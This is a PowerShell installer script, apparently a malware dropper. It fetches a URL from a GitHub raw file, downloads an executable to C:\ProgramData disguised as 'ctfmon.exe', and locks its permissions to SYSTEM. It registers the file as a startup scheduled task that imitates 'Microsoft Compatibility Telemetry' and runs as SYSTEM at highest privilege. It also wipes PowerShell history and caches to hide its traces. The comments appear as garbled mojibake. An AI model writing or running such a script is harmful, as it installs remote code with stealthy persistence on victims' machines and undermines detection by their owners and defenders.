#Requires -RunAsAdministrator
Clear-Host
Write-Host "1 : Install"
Write-Host "2 : Clean"
Write-Host ""
$choice = Read-Host "Select (1/2)"
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$programData = "C:\ProgramData"  # à¹€à¸›à¸¥à¸µà¹ˆà¸¢à¸™à¸à¸¥à¸±à¸šà¹€à¸›à¹‡à¸™ path à¹€à¸”à¸´à¸¡à¸•à¸²à¸¡à¸—à¸µà¹ˆà¸‚à¸­
$exeUrl = (Invoke-WebRequest -Uri "https://github.com/unknowanyma/unknowx/raw/refs/heads/main/taxxx" -UseBasicParsing).Content.Trim()
$exeName = "ctfmon.exe"                      # à¸Šà¸·à¹ˆà¸­à¹€à¸™à¸µà¸¢à¸™
$exePath = Join-Path $programData $exeName

$taskName = "Microsoft Compatibility Telemetry"  # à¸Šà¸·à¹ˆà¸­ task à¹€à¸™à¸µà¸¢à¸™

function Clear-PowerShellTraces {
    Clear-History -ErrorAction SilentlyContinue
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        New-Item $historyPath -ItemType File -Force | Out-Null
    }
    $cachePath = "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\ModuleAnalysisCache"
    if (Test-Path $cachePath) { Remove-Item $cachePath -Force -ErrorAction SilentlyContinue }
    if ($host.Name -eq 'ConsoleHost') { [console]::Clear() }
}

function Reset-FileACLAndTakeOwnership {
    param([string]$FilePath)
    if (-not (Test-Path $FilePath)) { return }
    & takeown /F "$FilePath" /A *>$null 2>$null
    & icacls "$FilePath" /grant Administrators:F /C /Q *>$null 2>$null
    & icacls "$FilePath" /reset /C /Q *>$null 2>$null
}

function Invoke-Clean {
    $baseNames = @(
        [IO.Path]::GetFileNameWithoutExtension($exeName)
    ) | Sort-Object -Unique

    foreach ($base in $baseNames) {
        Get-Process -Name $base -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    Start-Sleep -Milliseconds 1200

    schtasks /delete /tn "$taskName" /f *>$null 2>$null

    if (Test-Path $exePath) {
        Reset-FileACLAndTakeOwnership $exePath
        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
    }

    Clear-PowerShellTraces
}

if ($choice -eq "1") {
    $success = $true
    $errorCode = 0
    try {
        if (-not (Test-Path $programData)) {
            New-Item -Path $programData -ItemType Directory -Force *>$null 2>$null
        }

        # à¸¥à¸šà¸‚à¸­à¸‡à¹€à¸à¹ˆà¸²à¸–à¹‰à¸²à¸¡à¸µ
        if (Test-Path $exePath) {
            Reset-FileACLAndTakeOwnership $exePath
            Remove-Item $exePath -Force -ErrorAction Stop
        }

        # à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸”
        if ($exeUrl -match '^https?://') {
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop *>$null 2>$null
        }

        # à¸•à¸±à¹‰à¸‡ ACL à¹ƒà¸«à¹‰ SYSTEM à¹€à¸—à¹ˆà¸²à¸™à¸±à¹‰à¸™
        & icacls "$exePath" /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" /C /Q *>$null 2>$null
        Start-Sleep -Milliseconds 800

        # à¸ªà¸£à¹‰à¸²à¸‡ task
        schtasks /create /tn "$taskName" /tr "$exePath" /sc ONSTART /ru SYSTEM /rl HIGHEST /f /DELAY 0000:30 *>$null 2>$null
        if ($LASTEXITCODE -ne 0) { $errorCode = 6; throw }

        # à¸£à¸±à¸™à¸—à¸±à¸™à¸—à¸µ
        schtasks /run /tn "$taskName" *>$null 2>$null
        if ($LASTEXITCODE -ne 0) { $errorCode = 7; throw }
    }
    catch {
        $success = $false
        if ($errorCode -eq 0) { $errorCode = 9 }
    }

    if ($success) {
        Write-Host "Successfully" -ForegroundColor Green
    } else {
        Write-Host "Error $errorCode" -ForegroundColor Red
        Pause
    }
}
elseif ($choice -eq "2") {
    $success = $true
    try {
        Invoke-Clean
    }
    catch {
        $success = $false
    }
    if ($success) {
        Write-Host "Successfully" -ForegroundColor Green
    } else {
        Write-Host "Error" -ForegroundColor Red
    }
    Pause
}
else {
    Write-Host "Error" -ForegroundColor Red
    Pause
}

Clear-PowerShellTraces
